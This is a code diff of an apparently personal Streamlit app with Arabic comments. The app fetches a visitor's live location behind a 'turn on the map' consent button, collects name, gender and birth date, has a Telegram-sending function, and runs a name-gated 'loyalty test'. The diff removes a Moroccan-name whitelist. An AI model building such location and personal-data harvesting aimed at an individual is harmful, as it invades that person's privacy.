@@ -29,7 +29,7 @@ st.markdown(
     unsafe_allow_html=True,
 )
 
-# دالة جلب الموقع المباشر والتقريبي للزائر
+# دالة جلب الموقع المباشر للزائر
 def fetch_location_link():
     try:
         from streamlit.web.server.websocket_headers import _get_websocket_headers
@@ -103,46 +103,7 @@ def send_telegram_msg(text_message):
         return False, f"خطأ اتصال: {str(e)}"
 
 
-# التحقق من الأسماء
-def is_legally_allowed_in_morocco(name: str) -> bool:
-    clean_name = name.strip().lower()
-    if clean_name in ["mark", "marc", "مارك"]:
-        return True
-
-    moroccan_names_latin = {
-        "imane", "iman", "eman", "youssef", "yousef", "mohamed", "mohammed",
-        "muhammad", "simohamed", "mehdi", "el mehdi", "amine", "hamza", "omar",
-        "reda", "zakaria", "zakariya", "ayman", "aymane", "adam", "rayan",
-        "rayane", "othmane", "otman", "anass", "anas", "khalid", "hassan",
-        "houssain", "soufiane", "tariq", "tarik", "walid", "bilal", "badr",
-        "salma", "sara", "sarah", "hajar", "hajer", "aya", "fatima", "zohra",
-        "khadija", "laila", "layla", "meriem", "meryem", "noha", "nouhaila",
-        "chaimae", "chaimaa", "kenza", "yasmine", "ghita", "houda", "soundous",
-        "wiam", "ikram", "nada", "kaoutar", "kawtar", "asmae", "asma", "nour",
-        "noor", "manal", "soukaina", "soukayna", "douae", "douaa", "marwa",
-        "marouan", "marouane", "driss", "yassine", "yassin", "nabil", "nizar",
-        "faysal", "rachid", "aziz", "said", "mustapha", "karim", "brahim",
-        "ibrahim", "achraf", "mounir", "houssam", "hicham", "kamal", "fouad",
-        "jamal", "ismail", "ilias", "ilyas", "saad", "souad", "nawal", "rabab",
-        "bouchra", "siham", "hanane", "najat", "latifa", "malika", "samira",
-        "loubna", "mina", "rachida"
-    }
-
-    if clean_name in moroccan_names_latin:
-        return True
-
-    if re.search(r"[\u0600-\u06FF]", clean_name):
-        blocked_foreign_arabic = [
-            "جون", "ديفيد", "مايكل", "أليكس", "ستيفن", "روبرت", "ويليام", "توماس", "ألكسندر", "جورج"
-        ]
-        if clean_name in blocked_foreign_arabic:
-            return False
-        return True
-
-    return False
-
-
-# --- الخطوة الأولى: إدخال البيانات والتأكد من التفعيل ---
+# --- الخطوة الأولى: إدخال البيانات وتأكيد الخريطة ---
 if st.session_state.step == 1:
     st.markdown(
         """
@@ -230,7 +191,7 @@ if st.session_state.step == 1:
         unsafe_allow_html=True,
     )
 
-    # زر التفعيل المباشر المستقر تكنولوجياً لجميع الأجهزة
+    # زر تفعيل الخريطة المباشر
     if not is_gps_active:
         if st.button("🌐 اضغط هنا لتشغيل الخريطة والموافقة على الموقع 📍", key="green_gps_btn"):
             st.session_state.user_location_link = fetch_location_link()
@@ -255,9 +216,8 @@ if st.session_state.step == 1:
                 st.warning("Please enter your name first!")
             elif not st.session_state.location_activated:
                 st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بالضغط على الزر الأخضر بالأسفل لتفعيل الخريطة أولاً!")
-            elif not is_legally_allowed_in_morocco(name_val):
-                st.error("⚠️ This name cannot be entered, please try again!")
             else:
+                # قبول أي اسم بدون قيود
                 st.session_state.visitor_name = name_val
                 st.session_state.visitor_gender = gender_in
                 st.session_state.visitor_dob = str(dob_in)
@@ -277,7 +237,7 @@ if st.session_state.step == 1:
                     st.session_state.step = 2
                     st.rerun()
 
-# --- الخطوة الثانية: السؤال الرئيسي وتفعيل الأغاني والمؤثرات ---
+# --- الخطوة الثانية: اختبار الوفاء والنتائج ---
 elif st.session_state.step == 2:
     ALLOWED_NAMES = ["imane", "iman", "eman"]
 
